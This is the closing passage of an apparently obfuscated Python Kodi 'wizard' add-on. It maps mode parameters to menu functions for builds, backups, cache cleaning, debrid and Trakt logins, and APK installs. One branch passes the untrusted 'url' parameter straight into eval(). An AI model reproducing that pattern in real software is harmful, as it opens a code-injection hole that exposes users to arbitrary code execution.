try :name =urllib .unquote_plus (params ["name"])#line:5637
except :pass #line:5638
try :url =urllib .unquote_plus (params ["url"])#line:5639
except :pass #line:5640
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5642
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5643
def setView (O00O0OOOOOO0OOOOO ,O00O0O0OOOOOOO000 ):#line:5644
	if wiz .getS ('auto-view')=='true':#line:5645
		OO0O00OO000O0OO0O =wiz .getS (O00O0O0OOOOOOO000 )#line:5646
		if OO0O00OO000O0OO0O =='50'and KODIV >=17 and SKIN =='skin.estuary':OO0O00OO000O0OO0O ='55'#line:5647
		if OO0O00OO000O0OO0O =='500'and KODIV >=17 and SKIN =='skin.estuary':OO0O00OO000O0OO0O ='50'#line:5648
		wiz .ebi ("Container.SetViewMode(%s)"%OO0O00OO000O0OO0O )#line:5649
if mode ==None :index ()#line:5651
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5653
elif mode =='builds':buildMenu ()#line:5654
elif mode =='viewbuild':viewBuild (name )#line:5655
elif mode =='buildinfo':buildInfo (name )#line:5656
elif mode =='buildpreview':buildVideo (name )#line:5657
elif mode =='install':buildWizard (name ,url )#line:5658
elif mode =='theme':buildWizard (name ,mode ,url )#line:5659
elif mode =='viewthirdparty':viewThirdList (name )#line:5660
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5661
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5662
elif mode =='maint':maintMenu (name )#line:5664
elif mode =='passpin':passandpin ()#line:5665
elif mode =='backmyupbuild':backmyupbuild ()#line:5666
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5667
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5668
elif mode =='advancedsetting':advancedWindow (name )#line:5669
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5670
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5671
elif mode =='asciicheck':wiz .asciiCheck ()#line:5672
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5673
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5674
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5675
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5676
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5677
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5678
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5679
elif mode =='currentsettings':viewAdvanced ()#line:5680
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5681
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5682
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5683
elif mode =='fixskin':backtokodi ()#line:5684
elif mode =='testcommand':testcommand ()#line:5685
elif mode =='logsend':logsend ()#line:5686
elif mode =='rdon':rdon ()#line:5687
elif mode =='rdoff':rdoff ()#line:5688
elif mode =='setrd':setrealdebrid ()#line:5689
elif mode =='setrd2':setautorealdebrid ()#line:5690
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5691
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5692
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5693
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5694
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5695
elif mode =='freshstart':freshStart ()#line:5696
elif mode =='forceupdate':wiz .forceUpdate ()#line:5697
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5698
elif mode =='forceclose':wiz .killxbmc ()#line:5699
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5700
elif mode =='hidepassword':wiz .hidePassword ()#line:5701
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5702
elif mode =='enableaddons':enableAddons ()#line:5703
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5704
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5705
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5706
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5707
elif mode =='uploadlog':uploadLog .Main ()#line:5708
elif mode =='viewlog':LogViewer ()#line:5709
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5710
elif mode =='viewerrorlog':errorChecking (all =True )#line:5711
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5712
elif mode =='purgedb':purgeDb ()#line:5713
elif mode =='fixaddonupdate':fixUpdate ()#line:5714
elif mode =='removeaddons':removeAddonMenu ()#line:5715
elif mode =='removeaddon':removeAddon (name )#line:5716
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5717
elif mode =='removedata':removeAddonData (name )#line:5718
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5719
elif mode =='systeminfo':systemInfo ()#line:5720
elif mode =='restorezip':restoreit ('build')#line:5721
elif mode =='restoregui':restoreit ('gui')#line:5722
elif mode =='restoreaddon':restoreit ('addondata')#line:5723
elif mode =='restoreextzip':restoreextit ('build')#line:5724
elif mode =='restoreextgui':restoreextit ('gui')#line:5725
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5726
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5727
elif mode =='traktsync':traktsync ()#line:5728
elif mode =='apk':apkMenu (name )#line:5730
elif mode =='apkscrape':apkScraper (name )#line:5731
elif mode =='apkinstall':apkInstaller (name ,url )#line:5732
elif mode =='speed':speedMenu ()#line:5733
elif mode =='net':net_tools ()#line:5734
elif mode =='GetList':GetList (url )#line:5735
elif mode =='youtube':youtubeMenu (name )#line:5736
elif mode =='viewVideo':playVideo (url )#line:5737
elif mode =='addons':addonMenu (name )#line:5739
elif mode =='addoninstall':addonInstaller (name ,url )#line:5740
elif mode =='savedata':saveMenu ()#line:5742
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5743
elif mode =='managedata':manageSaveData (name )#line:5744
elif mode =='whitelist':wiz .whiteList (name )#line:5745
elif mode =='trakt':traktMenu ()#line:5747
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5748
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5749
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5750
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5751
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5752
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5753
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5754
elif mode =='realdebrid':realMenu ()#line:5756
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5757
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5758
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5759
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5760
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5761
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5762
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5763
elif mode =='login':loginMenu ()#line:5765
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5766
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5767
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5768
elif mode =='clearlogin':loginit .clearSaved (name )#line:5769
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5770
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5771
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5772
elif mode =='contact':notify .contact (CONTACT )#line:5774
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5775
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5776
elif mode =='developer':developer ()#line:5778
elif mode =='converttext':wiz .convertText ()#line:5779
elif mode =='createqr':wiz .createQR ()#line:5780
elif mode =='testnotify':testnotify ()#line:5781
elif mode =='testnotify2':testnotify2 ()#line:5782
elif mode =='servicemanual':servicemanual ()#line:5783
elif mode =='fastinstall':fastinstall ()#line:5784
elif mode =='testupdate':testupdate ()#line:5785
elif mode =='testfirst':testfirst ()#line:5786
elif mode =='testfirstrun':testfirstRun ()#line:5787
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5788
elif mode =='bg':wiz .bg_install (name ,url )#line:5790
elif mode =='bgcustom':wiz .bg_custom ()#line:5791
elif mode =='bgremove':wiz .bg_remove ()#line:5792
elif mode =='bgdefault':wiz .bg_default ()#line:5793
elif mode =='rdset':rdsetup ()#line:5794
elif mode =='mor':morsetup ()#line:5795
elif mode =='mor2':morsetup2 ()#line:5796
elif mode =='resolveurl':resolveurlsetup ()#line:5797
elif mode =='urlresolver':urlresolversetup ()#line:5798
elif mode =='forcefastupdate':forcefastupdate ()#line:5799
elif mode =='traktset':traktsetup ()#line:5800
elif mode =='placentaset':placentasetup ()#line:5801
elif mode =='flixnetset':flixnetsetup ()#line:5802
elif mode =='reptiliaset':reptiliasetup ()#line:5803
elif mode =='yodasset':yodasetup ()#line:5804
elif mode =='numbersset':numberssetup ()#line:5805
elif mode =='uranusset':uranussetup ()#line:5806
elif mode =='genesisset':genesissetup ()#line:5807
elif mode =='fastupdate':fastupdate ()#line:5808
elif mode =='folderback':folderback ()#line:5809
elif mode =='menudata':Menu ()#line:5810
elif mode =='infoupdate':infobuild ()#line:5811
elif mode =='wait':wait ()#line:5812
elif mode ==2 :#line:5813
        wiz .torent_menu ()#line:5814
elif mode ==3 :#line:5815
        wiz .popcorn_menu ()#line:5816
elif mode ==8 :#line:5817
        wiz .metaliq_fix ()#line:5818
elif mode ==9 :#line:5819
        wiz .quasar_menu ()#line:5820
elif mode ==5 :#line:5821
        swapSkins ('skin.Premium.mod')#line:5822
elif mode ==13 :#line:5823
        wiz .elementum_menu ()#line:5824
elif mode ==16 :#line:5825
        wiz .fix_wizard ()#line:5826
elif mode ==17 :#line:5827
        wiz .last_play ()#line:5828
elif mode ==18 :#line:5829
        wiz .normal_metalliq ()#line:5830
elif mode ==19 :#line:5831
        wiz .fast_metalliq ()#line:5832
elif mode ==20 :#line:5833
        wiz .fix_buffer2 ()#line:5834
elif mode ==21 :#line:5835
        wiz .fix_buffer3 ()#line:5836
elif mode ==11 :#line:5837
        wiz .fix_buffer ()#line:5838
elif mode ==15 :#line:5839
        wiz .fix_font ()#line:5840
elif mode ==14 :#line:5841
        wiz .clean_pass ()#line:5842
elif mode ==22 :#line:5843
        wiz .movie_update ()#line:5844
elif mode =='adv_settings':buffer1 ()#line:5845
elif mode =='getpass':getpass ()#line:5846
elif mode =='setpass':setpass ()#line:5847
elif mode =='setuname':setuname ()#line:5848
elif mode =='passandUsername':passandUsername ()#line:5849
elif mode =='9':disply_hwr ()#line:5850
elif mode =='99':disply_hwr2 ()#line:5851
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))